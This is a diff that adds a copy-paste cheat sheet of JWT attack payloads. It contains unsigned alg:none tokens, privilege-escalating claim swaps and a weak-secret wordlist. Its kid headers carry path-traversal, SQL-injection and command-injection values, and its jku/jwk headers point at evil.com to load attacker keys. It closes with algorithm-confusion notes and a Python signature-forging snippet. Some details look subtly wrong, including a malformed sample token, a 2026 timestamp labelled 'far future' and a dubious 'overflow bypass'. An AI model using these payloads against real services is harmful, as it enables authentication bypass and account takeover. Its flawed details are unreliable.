@@ -1,0 +1,118 @@
+# JWT Attack Payloads (copy-paste)
+
+## 1. alg:none tokens (no signature)
+Replace header+payload, keep trailing dot:
+```
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxOTk5OTk5OTk5fQ.
+```
+Header variations that servers may still accept:
+```
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+{"alg":"NONE","typ":"JWT"}
+{"alg":"nOnE"}
+{"alg":"null"}
+{"alg":"none","typ":"JWT","kid":null}
+```
+
+## 2. Payload claim swaps (keep original signature)
+Base64url(payload) with modified claims:
+```
+{"sub":"1","role":"admin","exp":1999999999}
+{"sub":"1","isAdmin":true,"exp":1999999999}
+{"sub":"0"}
+{"sub":0}
+{"admin":true,"exp":1999999999}
+{"role":"superuser"}
+{"group":"sg-admins"}
+{"ver":"99"}
+{"exp":2524608000}
+{"id":1,"privileges":["all"]}
+```
+
+## 3. HS256 weak-secret test wordlist (top 15)
+```
+secret
+password
+123456
+secret123
+changeme
+jwt
+app
+admin
+letmein
+qwerty
+football
+iloveyou
+unlockme
+test
+default
+```
+
+## 4. kid header injection
+```
+{"alg":"HS256","kid":"../../../../../../../../etc/passwd"}
+{"alg":"HS256","kid":"/dev/null"}
+{"alg":"HS256","kid":"../../../../dev/null"}
+{"alg":"HS256","kid":"../../../etc/passwd"}
+{"alg":"HS256","kid":"' OR 1=1--"}
+{"alg":"HS256","kid":"$(id)"}
+{"alg":"HS256","kid":"`id`"}
+{"alg":"HS256","kid":"http://evil.com/key.json"}
+{"alg":"HS256","kid":"https://allowed.com@evil.com/key.json"}
+{"alg":"HS256","kid":"../../../../tmp/key" , "sha256":true}
+```
+
+## 5. jwk / jku header injection
+```
+{"alg":"RS256","jku":"https://evil.com/jwks.json","kid":"ownkey"}
+{"alg":"RS256","jku":"https://target.com.evil.com/jwks.json","kid":"ownkey"}
+{"alg":"RS256","jwk":{"kty":"RSA","n":"...YOUR_MODULUS...","e":"AQAB"},"kid":"ownkey"}
+{"alg":"RS256","jku":"https://target.com/../../../../../evil/jwks.json","kid":"x"}
+```
+
+## 6. Algorithm confusion combos
+```
+HS512 / HS384 / HS256 signed with public key bytes
+HS256 signed with empty string secret (when kid points at /dev/null)
+RS256 with jwk self-signed attacker key
+```
+
+## 7. exp / nbf / iat edge cases
+```
+{"exp":0}
+{"exp":null}
+{"exp":1767225600}       # far future
+{"exp":999999999999}
+{"nbf":0,"iat":0}
+{"exp":"2038-01-19"};    # integer overflow bypass
+```
+
+## 8. Common JWKS endpoint locations
+```
+GET /.well-known/jwks.json
+GET /.well-known/openid-configuration
+GET /oauth2/jwks
+GET /certs
+GET /api/v1/keys
+GET /v1/keys
+GET /jwks.json
+GET /auth/jwks.json
+GET /keys
+```
+
+## 9. Random notes
+```
+# PKCS1 vs PKCS8 conversion for the public key
+openssl rsa -pubin -in public.pem -RSAPublicKey_out   # to PKCS1
+openssl pkey -pubin -in public.pem -outform DER        # to raw
+
+# jwt_tool algorithm confusion to HS256 with target cert
+# node sign hs256 with b"public_key"
+python3 -c "
+import hmac,hashlib,base64
+data=b'eyJgciOiJIUzI1NiJ9.eyJhZG1pbiI6dHJ1ZX0'
+key=b'-----BEGIN CERTIFICATE-----...'
+print(base64.urlsafe_b64encode(hmac.new(key,data,hashlib.sha256).digest()).rstrip(b'=').decode())
+"
+```
